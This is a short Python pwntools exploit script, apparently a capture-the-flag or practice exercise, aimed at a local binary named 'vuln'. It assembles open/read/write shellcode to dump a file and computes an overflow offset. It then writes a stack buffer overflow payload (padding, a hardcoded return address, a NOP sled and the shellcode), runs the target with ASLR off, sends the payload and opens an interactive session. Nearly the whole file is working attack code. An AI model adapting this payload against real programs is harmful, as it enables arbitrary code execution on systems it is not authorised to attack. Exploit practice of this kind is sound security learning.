#!/usr/bin/env python3

# import variables/functions from pwntools into our global namespace,
# for easy access
from pwn import *

exe_path = '/home/jdiamond/src/fatal_core_dump/bin/vuln'

context.binary = exe_path

# context.terminal = ['tmux', 'new-window'] # Example for tmux
# or for a specific terminal emulator
# context.terminal = ['xterm', '-e']


shellcode  = shellcraft.open('/home/jdiamond/cat.txt')
shellcode += shellcraft.read(3, 'rsp', 0x1000)
shellcode += shellcraft.write(1, 'rsp', 'rax')
shellcode += shellcraft.exit(0)
p = run_assembly(shellcode)
print(p.read())


# # send input to the program, followed by a newline char, "\n"
# # (cyclic(50) provides a cyclic string with 50 chars)
# p.sendline(cyclic(50))

# # make the process interactive, so you can interact
# # with it via its terminal
# p.interactive()
print(cyclic_find(0x6161616b))

#shellcode = shellcraft.sh()
print(shellcode)
print(hexdump(asm(shellcode)))

payload  = b'\x00' * 40
payload += p64(0x7fffffffecc0)
payload += b'\x90' * 100
payload += asm(shellcode)

with open('./bin/input2', 'wb') as fd:
    fd.write(payload)

p = process(exe_path, ignore_environ=True, aslr=False)

# Seems like it needs to be in tmux, or something to open a new screen
# gdb.attach(p, '''
# ''')

p.sendline(payload)
p.interactive()
